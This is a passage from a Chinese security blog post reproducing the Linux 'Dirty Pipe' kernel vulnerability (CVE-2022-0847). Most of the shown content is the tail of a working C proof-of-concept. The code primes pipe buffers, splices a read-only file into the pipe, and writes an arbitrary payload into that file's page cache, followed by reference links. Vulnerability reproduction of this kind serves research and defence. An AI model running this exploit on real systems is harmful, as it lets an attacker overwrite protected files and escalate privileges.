<span class="hljs-type">int</span> my_pipe[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> fd_read = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x10</span>] = &#123;<span class="hljs-string">&#x27;\x00&#x27;</span>&#125;;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">file_st</span>;</span><br>    <span class="hljs-type">uint64_t</span> offset = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span>(argc &lt; <span class="hljs-number">4</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x]The poc&#x27;s right use is: \n&lt;our_poc&gt; &lt;vuln_file&gt; &lt;offset&gt; &lt;payload&gt;\n&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[?]len &lt; 0 will read the hole file...&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+]Initial the pipe...&quot;</span>);<br>    initial_pipe(my_pipe);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+]Fill the pipe...&quot;</span>);<br>    fill_pipe(my_pipe);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+]drain the pipe...&quot;</span>);<br>    drain_pipe(my_pipe);<br>    <br>    fd_read = open(argv[<span class="hljs-number">1</span>], O_RDONLY);<br>    <br>    <span class="hljs-keyword">if</span>(fd_read &lt; <span class="hljs-number">0</span>)&#123;<br>       perror(<span class="hljs-string">&quot;open vuln file failed!&quot;</span>);<br>       <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(fstat(fd_read, &amp;file_st) &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;stat file failed!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(argv[<span class="hljs-number">2</span>] &gt; <span class="hljs-number">0</span>)<br>        offset = atoi(argv[<span class="hljs-number">2</span>]);<br>    <span class="hljs-keyword">else</span><br>        offset = file_st.st_size; <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, offset);<br>    <span class="hljs-keyword">if</span>(splice(fd_read, (<span class="hljs-type">uint64_t</span> *)&amp;offset, my_pipe[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;splice fd to pipe&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+]We successfully execute the splice...&quot;</span>);<br>    <span class="hljs-keyword">if</span>(write(my_pipe[<span class="hljs-number">1</span>], argv[<span class="hljs-number">3</span>], <span class="hljs-keyword">sizeof</span>(argv[<span class="hljs-number">3</span>])) &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;write failed&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    free_env(my_pipe);<br>    close(fd_read);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">initial_pipe</span><span class="hljs-params">(<span class="hljs-type">int</span> *my_pipe)</span>&#123;<br>    pipe(my_pipe);<br>    fcntl(my_pipe[<span class="hljs-number">1</span>], F_SETPIPE_SZ, <span class="hljs-number">1</span>*PAGE_SIZE); <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">fill_pipe</span><span class="hljs-params">(<span class="hljs-type">int</span> *my_pipe)</span>&#123;<br>    <span class="hljs-type">int</span> pipe_size = fcntl(my_pipe[<span class="hljs-number">1</span>], F_GETPIPE_SZ);<br>    <span class="hljs-type">int</span> nr = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]pipe_size is %d\n&quot;</span>, pipe_size);<br>    <span class="hljs-type">char</span> buffer[PAGE_SIZE] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-built_in">memset</span>(buffer, <span class="hljs-number">0x41</span>, <span class="hljs-keyword">sizeof</span>(buffer));<br>    <span class="hljs-keyword">for</span>(;pipe_size &gt; <span class="hljs-number">0</span>; pipe_size -= nr)<br>        nr = write(my_pipe[<span class="hljs-number">1</span>], buffer, (pipe_size &gt; PAGE_SIZE ? PAGE_SIZE : pipe_size));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]Fill the pipe done...\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">drain_pipe</span><span class="hljs-params">(<span class="hljs-type">int</span> *my_pipe)</span>&#123;<br>    <span class="hljs-type">int</span> pipe_size = fcntl(my_pipe[<span class="hljs-number">1</span>], F_GETPIPE_SZ);<br>    <span class="hljs-type">int</span> nr = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]pipe_size is %d\n&quot;</span>, pipe_size);<br>    <span class="hljs-type">char</span> buffer[PAGE_SIZE] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-keyword">for</span>(;pipe_size &gt; <span class="hljs-number">0</span>; pipe_size -= nr)<br>        nr = read(my_pipe[<span class="hljs-number">0</span>], buffer, (pipe_size &gt; PAGE_SIZE ? PAGE_SIZE : pipe_size));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]Drain the pipe done...\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">free_env</span><span class="hljs-params">(<span class="hljs-type">int</span> *pipe)</span>&#123;<br>    <span class="hljs-comment">/* 1. Free the pipe */</span><br>    close(pipe[<span class="hljs-number">0</span>]);<br>    close(pipe[<span class="hljs-number">1</span>]);<br>&#125;<br><br></code></pre></td></tr></table></figure>



<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://dirtypipe.cm4all.com/">洞主原文章</a></p>
<p><a target="_blank" rel="noopener" href="https://lolcads.github.io/posts/2022/06/dirty_pipe_cve_2022_0847/">精彩复现</a></p>
<p><a target="_blank" rel="noopener" href="https://lwn.net/Articles/849538/">folio是甚么</a></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/CVE/" class="category-chain-item">CVE</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/PWN/">#PWN</a>
      
        <a href="/tags/Linux/">#Linux</a>
      
        <a href="/tags/Kernel/">#Kernel</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>CVE-2022-0847漏洞复现</div>
      <div>https://peiandhao.github.io/2024/05/15/CVE-2022-0847漏洞复现/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>peiwithhao</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年5月15日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/05/23/corCTF2023-sysruption/" title="corCTF2023-sysruption赛题复现">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">corCTF2023-sysruption赛题复现</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/02/26/Clouds/" title="Paper:Cross Container Attacks:The Bewildered eBPF on Clouds">
                        <span class="hidden-mobile">Paper:Cross Container Attacks:The Bewildered eBPF on Clouds</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"Afm6UeM0VL6RfMOLAgwtyxs8-gzGzoHsz","appKey":"Vr60qrZIptqhJaXqWvDEknkH","path":"window.location.pathname","placeholder":"锐评一下","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <div> <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Pei</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Hao</span></a> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        总访问量 
        <span id="leancloud-site-pv"></span>
         次
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        总访客数 
        <span id="leancloud-site-uv"></span>
         人
      </span>
    
    

  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>




  
<script src="/js/DynamicLine.js"></script>



<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
